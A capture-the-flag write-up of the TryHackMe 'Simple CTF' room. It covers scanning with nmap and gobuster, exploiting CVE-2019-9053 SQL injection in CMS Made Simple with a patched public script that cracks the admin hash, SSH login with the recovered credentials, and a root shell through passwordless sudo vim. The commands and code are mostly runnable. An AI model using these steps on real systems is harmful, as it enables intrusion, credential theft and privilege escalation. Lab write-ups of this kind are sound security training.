# [Simple CTF THM Room](https://tryhackme.com/room/easyctf)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial target-ip
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-13 14:03 GMT
Nmap scan report for ip-10-10-195-171.eu-west-1.compute.internal (target-ip)
Host is up (0.00098s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.235.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:C3:13:4B:F6:A9 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.36 seconds
```

### Gobuster
```
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/diretory-list-2.3-medium.txt
```

```go
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/12/13 14:08:53 Starting gobuster
===============================================================
/simple (Status: 301)
/server-status (Status: 403)
===============================================================
2023/12/13 14:09:31 Finished
===============================================================
```

```
gobuster dir -u http://target-ip/simple -w /usr/share/wordlists/dirbuster/diretory-list-2.3-medium.txt
```

```go
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip/simple
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/12/13 14:16:59 Starting gobuster
===============================================================
/modules (Status: 301)
/uploads (Status: 301)
/doc (Status: 301)
/admin (Status: 301)
/assets (Status: 301)
/lib (Status: 301)
/tmp (Status: 301)
===============================================================
2023/12/13 14:17:32 Finished
===============================================================
```
## Enumeration
- Let's begin tackling this challenge by first visiting the web server hosted by the target machine as indicated by our [[Nmap]] scan. I always have a methodology that I like to follow when doing these challenges, and the first I thing I do when I see port 80 open on a box is to run [Gobuster](https://github.com/OJ/gobuster) to enumerate directories. While that runs, I go and look at the web page through my browser to see what I can see. I'll usually look at the page source and search for HTML comments and the like. In this case, when we get to the web page, we can see the following default Apache web page:

![Default Apache Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/8c67a1ac-cb40-44af-a251-b98317e9df86)


- There doesn't seem to be anything here, but our [Gobuster](https://github.com/OJ/gobuster) scan shows that there is a directory called `/simple` that we can reach. When we go there, we see the following:

![Simple CMS](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/3e213436-8c94-47b4-bdab-4a54da0e9a4b)


- It looks like the target is hosting a content management system, or CMS. In this case, it's the Simple CMS. If you are unaware, and CMS is software that helps users create, manage, or modify the contents of a web page without being tech savvy. Let's look around and see if there is anything that can give us more information. 
- Since we found the `/simple` directory and have discovered that it's a CMS, we should rerun our [Gobuster](https://github.com/OJ/gobuster) command with `/simple` appended on the end of the `http://target-ip` string. Typically, CMS systems like Simple or WordPress have a login page that we may be able to look at and further exploit. While that runs, let's do some manual enumeration. 
- At the bottom of the page, we can see a version number of the system that is running:

![CMS Version](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/416050ff-03ac-472c-b5c1-0ff37b4dffb6)


- That, paired with the guided questions offered by THM, leads us to think that there may be some publicly available exploit for this software version that can help us compromise the machine. Let's go do some research and see what we can find. 

## System Hacking
- According to [Exploit-DB](https://www.exploit-db.com/), Simple CMS version 2.2.8 is vulnerable to CVE-2019-9053. More information and the script we need for exploitation can be found [here](https://www.exploit-db.com/exploits/46635). Looking into the CVE a little more, we can see that it leverages [[SQL Injection]], or SQLI. We can pull that down onto our attacker machine to try to exploit the target machine. 
- [This](https://github.com/e-renna/CVE-2019-9053) repository holds the code I used, since there were some issues with the [Exploit-DB](https://www.exploit-db.com/) PoC out of the box. 
- Unfortunately, though it was written in the correct Python 3, I still had some issues. After a bit of research, I found that we had to edit the `crack_password` function to get it to work correctly. This was the code I used that ended up working:
```python
dict = open(wordlist, "rb")
    for line in dict:
        line = line.rstrip(b'\r\n')
        beautify_print_try(line.decode('utf-8', 'ignore'))
        if hashlib.md5(salt.encode('utf-8') + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line.decode('utf-8', 'ignore')
            break
```

- I replaced the line 58-64 from the code I downloaded with the above changes. 

- With that out of the way, we can use the following syntax to try to exploit the target:
```
python3 exploit.py -u http://target-ip/simple --crack -w /usr/share/wordlists/rockyou.txt 
```

- Here is the output:
```python
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

- So, after all that work, we finally have the username/password we are looking for. Let's try to log in via SSH with our found credentials:
```
ssh mitch@target-ip -p 2222
```

- This was successful. Now let's grab the user flag from the `mitch` home directory. 

## Privilege Escalation
- Now that we have a foothold on the box, let's look around. We can see that there is another directory in the `/home` directory, and the name of it is `sunbath`. 
- Let's see if `mitch` can run any binaries with sudo permissions without a password. To do this, we can use `sudo -l`. When we do, we get the following output:
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

- It looks like we can use Vim with root permissions. To spawn a privileged shell, we can reference [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#shell) and grab the appropriate syntax. It'll look something like this:
```
sudo vim -c ':!/bin/sh'
```

- And with that, we have become root. All we have to do now is `cat /root/root.txt`.

## Rabbit Holes
### Exploit Script
- While trying to get the exploit script, I originally downloaded the PoC from [Exploit-DB](https://www.exploit-db.com/). Here is the process I went through trying to troubleshoot it. 

- Now this is where things get a little tricky. I'm using the THM AttackBox, and when I try to run the exploit script, I get a syntax error regarding some `print` statements and their formatting. For example, here is the first error I get:
```python
File "exploit.py", line 25
    print "[+] Specify an url target"
                                    ^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print("[+] Specify an url target")?
```

- So I took the suggested recommendations and changed line 25 to look like this:
```python
print("[+] Specify an url target")
```

- There are several others lines that will return a similar syntax error, including lines 25-19, 63, 69, and 183. 
- Now after we do all that, things look like they're working okay. Until they aren't. This is the output I got when running the `exploit.py` file after correcting the print errors:
```python
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
[*] Now try to crack password
Traceback (most recent call last):
  File "exploit.py", line 184, in <module>
    crack_password()
  File "exploit.py", line 53, in crack_password
    for line in dict.readlines():
  File "/usr/lib/python3.6/codecs.py", line 321, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invalid continuation byte
```

- At this point, I basically gave up and went back to looking for other public PoC code. I found [this](https://github.com/e-renna/CVE-2019-9053) repository on GitHub that seemed to work out of the box. My scripting skills aren't great, so this was easier than trying to continue to figure out what was going wrong. I later discovered that the original PoC was written in Python 2 rather than Python 3. 
